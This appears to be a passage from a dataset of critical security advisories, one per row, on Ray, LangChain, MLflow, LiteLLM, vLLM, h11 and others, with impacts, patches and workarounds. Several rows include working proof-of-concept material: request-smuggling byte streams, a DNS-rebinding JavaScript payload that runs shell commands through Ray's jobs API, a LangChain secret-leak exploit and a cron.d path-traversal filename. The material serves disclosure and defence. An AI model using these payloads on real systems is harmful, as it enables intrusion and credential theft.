+- `\r\n`
+- `length` bytes of content
+- more bytes of content, as many as it takes until you find a `\r\n`
+
+For example, [pound](https://github.com/graygnuorg/pound/pull/43) had this bug -- it can happen if an implementer uses a generic ""read until end of line"" helper to consumes the trailing `\r\n`.
+
+In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are `\r\n`):
+
+```
+GET /one HTTP/1.1
+Host: localhost
+Transfer-Encoding: chunked
+
+5
+AAAAAXX2
+45
+0
+
+GET /two HTTP/1.1
+Host: localhost
+Transfer-Encoding: chunked
+
+0
+```
+
+Here h11 will interpret it as two requests, one with body `AAAAA45` and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body `AAAAXX20\r\n\r\nGET /two ...`. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a ""request smuggling"" attack. For example, if `/two` is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.
+
+Even worse, if our buggy reverse proxy receives two requests from different users:
+
+```
+GET /one HTTP/1.1
+Host: localhost
+Transfer-Encoding: chunked
+
+5
+AAAAAXX999
+0
+```
+
+```
+GET /two HTTP/1.1
+Host: localhost
+Cookie: SESSION_KEY=abcdef...
+```
+
+...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as _one_ request to `/one` whose body includes `/two`'s session key, potentially allowing one user to steal another's credentials.
+
+### Patches
+
+Fixed in h11 0.15.0.
+
+### Workarounds
+
+Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.
+
+### Credits
+
+Reported by Jeppe Bonde Weikop on 2025-01-09.",3
+60,CVE-2025-62593,"['CWE-94', 'CWE-352']",critical,Ray is vulnerable to Critical RCE via Safari & Firefox Browsers through DNS Rebinding Attack,"# Summary
+
+Developers working with Ray as a development tool can be exploited via a critical RCE vulnerability exploitable via Firefox and Safari. 
+
+Due to the longstanding [decision](https://docs.ray.io/en/releases-2.51.1/ray-security/index.html) by the Ray Development team to not implement any sort of authentication on critical endpoints, like the `/api/jobs` & `/api/job_agent/jobs/` has once again led to a severe vulnerability that allows attackers to execute arbitrary code against Ray. This time in a development context via the browsers Firefox and Safari.
+
+This vulnerability is due to an insufficient guard against browser-based attacks, as the current defense uses the `User-Agent` header starting with the string ""Mozilla"" as a defense mechanism. This defense is insufficient as the fetch specification allows the `User-Agent` header to be modified.
+
+Combined with a DNS rebinding attack against the browser, and this vulnerability is exploitable against a developer running Ray who inadvertently visits a malicious website, or is served a malicious advertisement ([malvertising](https://en.wikipedia.org/wiki/Malvertising)).
+
+# Details
+
+The mitigations implemented to protect against browser based attacks against local Ray nodes are insufficient.
+
+## Current Mitigation Strategies
+
+```python
+def is_browser_request(req: Request) -> bool:
+    """"""Checks if a request is made by a browser like user agent.
+
+    This heuristic is very weak, but hard for a browser to bypass- eg,
+    fetch/xhr and friends cannot alter the user-agent, but requests made with
+    an http library can stumble into this if they choose to user a browser like
+    user agent.
+    """"""
+    return req.headers[""User-Agent""].startswith(""Mozilla"")
+
+
+def deny_browser_requests() -> Callable:
+    """"""Reject any requests that appear to be made by a browser""""""
+
+    def decorator_factory(f: Callable) -> Callable:
+        @functools.wraps(f)
+        async def decorator(self, req: Request):
+            if is_browser_request(req):
+                return Response(
+                    text=""Browser requests not allowed"",
+                    status=aiohttp.web.HTTPMethodNotAllowed.status_code,
+                )
+            return await f(self, req)
+
+        return decorator
+
+    return decorator_factory
+```
+
+https://github.com/ray-project/ray/blob/f39a860436dca3ed5b9dfae84bd867ac10c84dc6/python/ray/dashboard/optional_utils.py#L129-L155
+
+```python
+    @aiohttp.web.middleware
+    async def browsers_no_post_put_middleware(self, request, handler):
+        if (
+            # A best effort test for browser traffic. All common browsers
+            # start with Mozilla at the time of writing.
+            dashboard_optional_utils.is_browser_request(request)
+            and request.method in [hdrs.METH_POST, hdrs.METH_PUT]
+        ):
+            return aiohttp.web.Response(
+                status=405, text=""Method Not Allowed for browser traffic.""
+            )
+
+        return await handler(request)
+```
+https://github.com/ray-project/ray/blob/e7889ae542bf0188610bc8b06d274cbf53790cbd/python/ray/dashboard/http_server_head.py#L184-L196
+
+This is because the fundamental assumption that the `User-Agent` header can't be manipulated is incorrect. In Firefox and in Safari, the `fetch` API allows the `User-Agent` header to be set to a different value. Chrome is not vulnerable, ironically, because of a [bug](https://issues.chromium.org/issues/40450316), bringing it out of spec with the `fetch` specification.
+
+Exploiting this vulnerability requires a DNS rebinding attack against the browser. Something trivially done by modern tooling like [nccgroup/singularity](https://github.com/nccgroup/singularity).
+
+# PoC
+
+Please note, this full PoC will be going live at time of disclosure.
+
+ 1. Launch Ray `ray start --head --port=6379`
+ 2. Ensure that the ray dashboard/service is running on port `8265`
+ 3. Launch an internet facing version of NCCGroup/Singularity following the [setup guide here](https://github.com/nccgroup/singularity/wiki/Setup-and-Installation).
+ 4. Visit the in Firefox or Safari: http://[my.singularity.instance]:8265/manager.html
+ 5. Under ""Attack Payload"" select: `Ray Jobs RCE (default port 8265)`
+ 6. Click ""Start Attack"". If you see a 404 error in the iFrame window that pops up, refresh the page and retry starting at step 3.
+ 7. Once the DNS rebinding attack succeeds (you may need to try a few times), an alert will appear, then the jobs API will be invoked, and the embedded shell code will be executed, popping up the calculator.
+
+If this attack doesn't work, consider clicking the ""Toggle Advanced Options"" and trying an alternative ""Rebinding Strategy"". I've personally been able to get this attack to work multiple times on MacOS on multiple different residential networks around the Seattle area. Some corporate networks _may_ block DNS rebinding attacks, but likely not many.
+
+## What's going on?
+
+This is the payload running in [nccgroup/singularity](https://github.com/nccgroup/singularity):
+
+```javascript
+/**
+ * This payload exploits Ray (https://github.com/ray-project/ray)
+ * It opens the ""Calculator"" application on various operating systems.
+ * The payload can be easily modified to target different OSes or implementations.
+ * The TCP port attacked is 8265.
+ */
+
+const RayRce = () => {
+
+    // Invoked after DNS rebinding has been performed
+    function attack(headers, cookie, body) {
+        // Get the current timestamp in milliseconds
+        const timestamp = Date.now();
+        
+        // OS-agnostic calculator command that tries multiple approaches
+        const calculatorCommand = `
+            # Try Windows calculator first
+            if command -v calc.exe >/dev/null 2>&1; then
+                echo Windows calculator launching
+                calc.exe &
+            # Try macOS calculator
+            elif command -v open >/dev/null 2>&1; then
+                echo macOS calculator launching
+                open -a Calculator &
+            elif [ -f ""/System/Applications/Calculator.app/Contents/MacOS/Calculator"" ]; then
+                echo macOS calculator launching
+                /System/Applications/Calculator.app/Contents/MacOS/Calculator &
+            # Try Linux calculators
+            elif command -v gnome-calculator >/dev/null 2>&1; then
+                echo Linux calculator launching
+                gnome-calculator &
+            elif command -v kcalc >/dev/null 2>&1; then
+                echo Linux calculator launching
+                kcalc &
+            elif command -v xcalc >/dev/null 2>&1; then
+                echo Linux calculator launching
+                xcalc &
+            # Fallback: try to find any calculator binary
+            else
+                echo Linux calculator launching
+                find /usr/bin /usr/local/bin /opt -name ""*calc*"" -type f -executable 2>/dev/null | head -1 | xargs -I {} {} &
+            fi
+            echo RAY RCE: By JLLeitschuh ${timestamp}
+        `;
+        
+        const data = {
+            ""entrypoint"": calculatorCommand,
+            ""runtime_env"": {},
+            ""job_id"": null,
+            ""metadata"": {
+                ""job_submission_id"": timestamp.toString(),
+                ""source"": ""nccgroup/singluarity""
+            }
+        };
+        
+        sooFetch('/api/jobs/', {
+            method: 'POST',
+            headers: {
+                'User-Agent': 'Other',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => {
+            console.log(response);
+            return response.json()
+        }) // parses JSON response into native JavaScript objects
+        .then(data => {
+            console.log('Success:', data);
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+        });
+    }
+    
+    // Invoked to determine whether the rebinded service
+    // is the one targeted by this payload. Must return true or false.
+    async function isService(headers, cookie, body) {
+        return sooFetch(""/"",{
+            mode: 'no-cors',
+            credentials: 'omit',
+        })
+        .then(function (response) {
+            return response.text()
+        })
+        .then(function (d) {
+            if (d.includes(""You need to enable JavaScript"")) {
+                return true;
+            } else {
+                return false;
+            }
+        })
+        .catch(e => { return (false); })
+    }
+
+    return {
+        attack,
+        isService
+    }
+}
+
+Registry[""Ray Jobs RCE""] = RayRce();
+```
+
+See: https://github.com/nccgroup/singularity/pull/68
+ 
+# Impact
+ 
+This vulnerability impacts developers running development/testing environments with Ray. If they fall victim to a phishing attack, or are served a malicious ad, they can be exploited and arbitrary shell code can be executed on their developer machine.
+
+This attack can also be leveraged to attack network-adjacent instance of ray by leveraging the browser as a confused deputy intermediary to attack ray instances running inside a private corporate network.
+
+# Fix
+
+The fix for this vulnerability is to update to Ray 2.52.0 or higher. This version also, finally, adds a disabled-by-default authentication feature that can further harden against this vulnerability: https://docs.ray.io/en/latest/ray-security/token-auth.html
+
+Fix commit: https://github.com/ray-project/ray/commit/70e7c72780bdec075dba6cad1afe0832772bfe09
+
+Several browsers have, after knowing about the attack for 19 years, recently begun hardening against DNS rebinding. ([Chrome Local Network Access](https://developer.chrome.com/blog/local-network-access)). These changes _may_ protect you, but a previous initiative, ""private network access"" was rolled back. So updating is highly recommended as a defense-in-depth strategy.
+
+# Credit
+
+The fetch bypass was originally theorized by @avilum at [Oligo](https://www.oligo.security/). The DNS rebinding step, full POC, and disclosure was by @JLLeitschuh while at [Socket](https://socket.dev/).",1
+61,CVE-2025-64712,"['CWE-22', 'CWE-73']",critical,Unstructured has Path Traversal via Malicious MSG Attachment that Allows Arbitrary File Write,"A Path Traversal vulnerability in the `partition_msg` function allows an attacker to write or overwrite arbitrary files on the filesystem when processing malicious MSG files with attachments.
+
+  ## Impact
+  An attacker can craft a malicious .msg file with attachment filenames containing path traversal sequences (e.g.,
+  `../../../etc/cron.d/malicious`). When processed with `process_attachments=True`, the library writes the attachment to an
+  attacker-controlled path, potentially leading to:
+
+  - Arbitrary file overwrite
+  - Remote code execution (via overwriting configuration files, cron jobs, or Python packages)
+  - Data corruption
+  - Denial of service
+
+  ## Affected Functionality
+  The vulnerability affects the MSG file partitioning functionality when `process_attachments=True` is enabled.
+
+  ## Vulnerability Details
+  The library does not sanitize attachment filenames in MSG files before using them in file write operations, allowing directory
+  traversal sequences to escape the intended output directory.
+
+  ## Workarounds
+  Until patched, users can:
+  - Set `process_attachments=False` when processing untrusted MSG files
+  - Avoid processing MSG files from untrusted sources
+  - Implement additional filename validation before processing",2
+62,CVE-2025-6544,['CWE-502'],critical,H2O affected by a deserialization vulnerability,"A deserialization vulnerability exists in h2oai/h2o-3 versions <= 3.46.0.7, allowing attackers to read arbitrary system files and execute arbitrary code. The vulnerability arises from improper handling of JDBC connection parameters, which can be exploited by bypassing regular expression checks and using double URL encoding. This issue impacts all users of the affected versions.",1
+63,CVE-2025-68664,['CWE-502'],critical,LangChain serialization injection vulnerability enables secret extraction in dumps/loads APIs,"## Summary
+
+A serialization injection vulnerability exists in LangChain's `dumps()` and `dumpd()` functions. The functions do not escape dictionaries with `'lc'` keys when serializing free-form dictionaries. The `'lc'` key is used internally by LangChain to mark serialized objects. When user-controlled data contains this key structure, it is treated as a legitimate LangChain object during deserialization rather than plain user data.
+
+### Attack surface
+
+The core vulnerability was in `dumps()` and `dumpd()`: these functions failed to escape user-controlled dictionaries containing `'lc'` keys. When this unescaped data was later deserialized via `load()` or `loads()`, the injected structures were treated as legitimate LangChain objects rather than plain user data.
+
+This escaping bug enabled several attack vectors:
+
+1. **Injection via user data**: Malicious LangChain object structures could be injected through user-controlled fields like `metadata`, `additional_kwargs`, or `response_metadata`
+2. **Class instantiation within trusted namespaces**: Injected manifests could instantiate any `Serializable` subclass, but only within the pre-approved trusted namespaces (`langchain_core`, `langchain`, `langchain_community`). This includes classes with side effects in `__init__` (network calls, file operations, etc.). Note that namespace validation was already enforced before this patch, so arbitrary classes outside these trusted namespaces could not be instantiated.
+
+### Security hardening
+
+This patch fixes the escaping bug in `dumps()` and `dumpd()` and introduces new restrictive defaults in `load()` and `loads()`: allowlist enforcement via `allowed_objects=""core""` (restricted to [serialization mappings](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py)), `secrets_from_env` changed from `True` to `False`, and default Jinja2 template blocking via `init_validator`. These are breaking changes for some use cases.
+
+## Who is affected?
+
+Applications are vulnerable if they:
+
+1. **Use `astream_events(version=""v1"")`** — The v1 implementation internally uses vulnerable serialization. Note: `astream_events(version=""v2"")` is not vulnerable.
+2. **Use `Runnable.astream_log()`** — This method internally uses vulnerable serialization for streaming outputs.
+3. **Call `dumps()` or `dumpd()` on untrusted data, then deserialize with `load()` or `loads()`** — Trusting your own serialization output makes you vulnerable if user-controlled data (e.g., from LLM responses, metadata fields, or user inputs) contains `'lc'` key structures.
+4. **Deserialize untrusted data with `load()` or `loads()`** — Directly deserializing untrusted data that may contain injected `'lc'` structures.
+5. **Use `RunnableWithMessageHistory`** — Internal serialization in message history handling.
+6. **Use `InMemoryVectorStore.load()`** to deserialize untrusted documents.
+7. Load untrusted generations from cache using **`langchain-community` caches**.
+8. Load untrusted manifests from the LangChain Hub via **`hub.pull`**.
+9. Use **`StringRunEvaluatorChain`** on untrusted runs.
+10. Use **`create_lc_store`** or **`create_kv_docstore`** with untrusted documents.
+11. Use **`MultiVectorRetriever`** with byte stores containing untrusted documents.
+12. Use **`LangSmithRunChatLoader`** with runs containing untrusted messages.
+
+The most common attack vector is through **LLM response fields** like `additional_kwargs` or `response_metadata`, which can be controlled via prompt injection and then serialized/deserialized in streaming operations.
+
+## Impact
+
+Attackers who control serialized data can extract environment variable secrets by injecting `{""lc"": 1, ""type"": ""secret"", ""id"": [""ENV_VAR""]}` to load environment variables during deserialization (when `secrets_from_env=True`, which was the old default). They can also instantiate classes with controlled parameters by injecting constructor structures to instantiate any class within trusted namespaces with attacker-controlled parameters, potentially triggering side effects such as network calls or file operations.
+
+Key severity factors:
+
+- Affects the serialization path - applications trusting their own serialization output are vulnerable
+- Enables secret extraction when combined with `secrets_from_env=True` (the old default)
+- LLM responses in `additional_kwargs` can be controlled via prompt injection
+
+## Exploit example
+
+```python
+from langchain_core.load import dumps, load
+import os
+
+# Attacker injects secret structure into user-controlled data
+attacker_dict = {
+    ""user_data"": {
+        ""lc"": 1,
+        ""type"": ""secret"",
+        ""id"": [""OPENAI_API_KEY""]
+    }
+}
+
+serialized = dumps(attacker_dict)  # Bug: does NOT escape the 'lc' key
+
+os.environ[""OPENAI_API_KEY""] = ""sk-secret-key-12345""
+deserialized = load(serialized, secrets_from_env=True)
+
+print(deserialized[""user_data""])  # ""sk-secret-key-12345"" - SECRET LEAKED!
+
+```
+
+## Security hardening changes (breaking changes)
+
+This patch introduces three breaking changes to `load()` and `loads()`:
+
+1. **New `allowed_objects` parameter** (defaults to `'core'`): Enforces allowlist of classes that can be deserialized. The `'all'` option corresponds to the list of objects [specified in `mappings.py`](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py) while the `'core'` option limits to objects within `langchain_core`. We recommend that users explicitly specify which objects they want to allow for serialization/deserialization.
+2. **`secrets_from_env` default changed from `True` to `False`**: Disables automatic secret loading from environment
+3. **New `init_validator` parameter** (defaults to `default_init_validator`): Blocks Jinja2 templates by default
+
+## Migration guide
+
+### No changes needed for most users
+
+If you're deserializing standard LangChain types (messages, documents, prompts, trusted partner integrations like `ChatOpenAI`, `ChatAnthropic`, etc.), your code will work without changes:
+
+```python
+from langchain_core.load import load
+
+# Uses default allowlist from serialization mappings
+obj = load(serialized_data)
+
+```
+
+### For custom classes
+
+If you're deserializing custom classes not in the serialization mappings, add them to the allowlist:
+
+```python
+from langchain_core.load import load
+from my_package import MyCustomClass
+
+# Specify the classes you need
+obj = load(serialized_data, allowed_objects=[MyCustomClass])
+```
+
+### For Jinja2 templates
+
+Jinja2 templates are now blocked by default because they can execute arbitrary code. If you need Jinja2 templates, pass `init_validator=None`:
+
+```python
+from langchain_core.load import load
+from langchain_core.prompts import PromptTemplate
+
+obj = load(
+    serialized_data,
+    allowed_objects=[PromptTemplate],
+    init_validator=None
+)
+
+```
+
+> [!WARNING]
+> Only disable `init_validator` if you trust the serialized data. Jinja2 templates can execute arbitrary Python code.
+
+### For secrets from environment
+
+`secrets_from_env` now defaults to `False`. If you need to load secrets from environment variables:
+
+```python
+from langchain_core.load import load
+
+obj = load(serialized_data, secrets_from_env=True)
+```
+
+
+## Credits
+
+* Dumps bug was reported by @yardenporat
+* Changes for security hardening due to findings from @0xn3va and @VladimirEliTokarev",1
+64,CVE-2026-0545,['CWE-306'],critical,mlflow: FastAPI job endpoints under `/ajax-api/3.0/jobs/*` are not protected by authentication or authorization,"In mlflow/mlflow, the FastAPI job endpoints under `/ajax-api/3.0/jobs/*` are not protected by authentication or authorization when the `basic-auth` app is enabled. This vulnerability affects the latest version of the repository. If job execution is enabled (`MLFLOW_SERVER_ENABLE_JOB_EXECUTION=true`) and any job function is allowlisted, any network client can submit, read, search, and cancel jobs without credentials, bypassing basic-auth entirely. This can lead to unauthenticated remote code execution if allowed jobs perform privileged actions such as shell execution or filesystem changes. Even if jobs are deemed safe, this still constitutes an authentication bypass, potentially resulting in job spam, denial of service (DoS), or data exposure in job results.",8
+65,CVE-2026-0596,['CWE-78'],critical,Mlflow: Command Injection when serving models with enable_mlserver=True,"A command injection vulnerability exists in Mlflow when serving a model with `enable_mlserver=True`. The `model_uri` is embedded directly into a shell command executed via `bash -c` without proper sanitization. If the `model_uri` contains shell metacharacters, such as `$()` or backticks, it allows for command substitution and execution of attacker-controlled commands. This vulnerability affects the latest version of mlflow/mlflow and can lead to privilege escalation if a higher-privileged service serves models from a directory writable by lower-privileged users.",7
+66,CVE-2026-2635,['CWE-1393'],critical,MLflow Use of Default Password Authentication Bypass Vulnerability,"This vulnerability allows remote attackers to bypass authentication on affected installations of MLflow. Authentication is not required to exploit this vulnerability.
+
+The specific flaw exists within the basic_auth.ini file. The file contains hard-coded default credentials. An attacker can leverage this vulnerability to bypass authentication and execute arbitrary code in the context of the administrator.",7
+67,CVE-2026-2651,"['CWE-862', 'CWE-1220']",critical,MLflow allows unauthorized access to multipart upload endpoints when the `--serve-artifacts` mode is enabled,"A vulnerability in MLflow versions <=3.10.1.dev0 allows unauthorized access to multipart upload (MPU) endpoints when the `--serve-artifacts` mode is enabled. The authorization logic does not enforce resource-level permission checks for `/mlflow-artifacts/mpu/*` endpoints, enabling attackers to overwrite artifacts belonging to other users. This can lead to unauthorized cross-user writes, model supply chain poisoning, and arbitrary code execution when compromised models are loaded. The issue is resolved in version 3.10.0.",8
+68,CVE-2026-35030,['CWE-287'],critical,LiteLLM: Authentication bypass via OIDC userinfo cache key collision,"###  Impact
+
+When JWT authentication is enabled (`enable_jwt_auth: true`), the OIDC userinfo cache uses `token[:20]` as the cache key. JWT headers produced by the same signing algorithm generate identical first 20 characters.
+
+This configuration option is not enabled by default. **Most instances are not affected.**
+
+An unauthenticated attacker can craft a token whose first 20 characters match a legitimate user's cached token. On cache hit, the attacker inherits the legitimate user's identity and permissions. This affects deployments with JWT/OIDC authentication enabled.
+
+###  Patches
+
+Fixed in v1.83.0. The cache key now uses the full hash of the JWT token.
+
+###  Workarounds
+
+Disable OIDC userinfo caching by setting the cache TTL to 0, or disable JWT authentication entirely.",2
+69,CVE-2026-4035,['CWE-201'],critical,MLflow: Environment variable injection in AI Gateway secrets enables server-side credential exfiltration,"A vulnerability in mlflow/mlflow versions prior to 3.11.0 allows for the resolution of environment variables in AI Gateway secrets, which can be exploited to exfiltrate sensitive server-side environment credentials to an attacker-controlled endpoint. This issue arises because the `api_key` field in gateway secrets can accept `$ENV_VAR` references, which are resolved against the MLflow server's environment during runtime. The resolved secrets are then sent in provider authentication headers to the configured upstream `api_base`. This vulnerability can be exploited by low-privileged authenticated users in basic-auth deployments or by unauthenticated users in default deployments without `basic-auth`. The impact includes potential leakage of sensitive credentials such as cloud artifact credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`), which could lead to artifact poisoning and cross-boundary code execution in downstream environments. The issue is fixed in version 3.11.0.",8
+70,CVE-2026-44727,"['CWE-79', 'CWE-1021']",critical,Jupyter Server: Stored XSS in `NbconvertFileHandler` / `NbconvertPostHandler` via missing `sandbox` CSP ,"The nbconvert HTTP handlers in jupyter_server render user-authored notebook HTML under the Jupyter origin without a sandbox directive in their `Content-Security-Policy`. 
+
+Combined with `nbconvert.HTMLExporter`'s default non-sanitizing behavior, a notebook carrying an HTML payload in a display_data output triggers stored XSS with cookie access, full /api/* authority, and kernel RCE.
+
+### Impact
+
+An authenticated victim who navigates to `/nbconvert/html/<path>` containing attacker-authored output can have their token exfiltrated to another domain because it is executed in the Jupyter origin.
+
+### Patches
+
+Fixed in v2.20.0, commit [6cbee8d](https://github.com/jupyter-server/jupyter_server/commit/6cbee8d65e71abac851c4492fea987ad080580bd)
+
+
+### Workarounds
+
+For deployments where editing the installed jupyter_server is impractical (containerized builds, read-only images), adding this to jupyter_server_config.py has the same effect as the patch above without touching source files:
+
+```
+import jupyter_server.nbconvert.handlers as _nb
+
+def _csp(self):
+    return super(type(self), self).content_security_policy + ""; sandbox allow-scripts""
+
+_nb.NbconvertFileHandler.content_security_policy = property(_csp)
+_nb.NbconvertPostHandler.content_security_policy = property(_csp)
+```",4
+71,CVE-2026-45829,['CWE-94'],critical,ChromaDB Python project has a pre-authentication code injection vulnerability,"A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the /api/v2/tenants/{tenant}/databases/{db}/collections endpoint.",5
+72,CVE-2026-48746,"['CWE-444', 'CWE-501']",critical,vLLM: OpenAI auth bypass,"### Summary
+
+A vulnerability in ASGI web servers and starlette's trust on those web servers enables an authentication bypass of the OpenAI API `AuthenticationMiddleware`, which was discovered during @x41sec's source code audit.
+It allows to use the API without providing the configured `VLLM_API_KEY` or `--api-key`.
+
+### Details
+
+In https://github.com/vllm-project/vllm/blob/v0.14.0/vllm/entrypoints/openai/api_server.py#L689-L692 the `url_path` is taken from the `URL`, which is reconstructed by _starlette_ based on the request `scope`.
+
+```py
+from starlette.datastructures import URL, Headers, MutableHeaders, State
+
+# ...
+
+url_path = URL(scope=scope).path.removeprefix(root_path)
+headers = Headers(scope=scope)
+if url_path.startswith(""/v1"") and not self.verify_token(headers):
+    response = JSONResponse(content={""error"": ""Unauthorized""}, status_code=401)
+    return response(scope, receive, send)
+return self.app(scope, receive, send)
+```
+
+The request `scope` includes the request's `Host:` header and reconstructs the URL as shown below:
+
+```py
+f""{scheme}://{host_header}{path}""
+```
+
+Neither starlette nor [any of the ASGI servers](https://asgi.readthedocs.io/en/latest/implementations.html#servers) (including uvicorn, which vllm uses) properly filter the `Host:` header for invalid characters. This allows an attacker to include special URL characters such as `/` or `?` in the `Host:` header and thereby control the reconstructed URL and it's `.path` attribute.
+
+FastAPI/starlette's routing uses the HTTP path and does not depend on the parsed url.path attribute, allowing attackers to reach an endpoint via a certain path while providing a different value in the `.path`.
+
+### Impact
+- Instances of vllm that use an API Key for the OpenAI API and expose the API to attackers.
+- Instances behind an RFC-conforming web server (such as nginx) are **not** affected.",1
+73,CVE-2026-49468,['CWE-290'],critical,LiteLLM: Authentication Bypass via Host Header Injection,"### Impact
+
+A Host-header parsing flaw in the LiteLLM proxy could, under specific conditions, allow unauthenticated access to protected management routes.
+
+The auth layer derived the effective route from `request.url.path` in `litellm/proxy/auth/auth_utils.py::get_request_route()`, which Starlette reconstructs from the `Host` header. A crafted `Host` could therefore make the auth gate evaluate a different route from the one FastAPI dispatched.
+
+**Most deployments are not affected.** The bypass is blocked by any upstream layer that validates or normalizes `Host`, such as:
+
+- a CDN or WAF, such as Cloudflare
+- a reverse proxy with `server_name` allowlists
+- a host-based load balancer
+
+**LiteLLM Cloud customers are not affected.**
+
+### Patches
+
+Fixed in **`1.84.0`**. Upgrade to `1.84.0` or later. No configuration change is required.
+
+### Workarounds
+
+If upgrading is not immediately possible, place the proxy behind an upstream component that validates or normalizes the `Host` header before forwarding (a CDN/WAF, a reverse proxy with explicit `server_name` allowlists, or a cloud load balancer with host-based routing rules), or otherwise restrict network access to the proxy listener.
+
+### References
+
+- Patched release: [`v1.84.0`](https://github.com/BerriAI/litellm/releases/tag/v1.84.0)
+
+**Discovery Credit**: Le The Thang (KCSC) and Kim Ngoc Chung (One Mount Group)",3
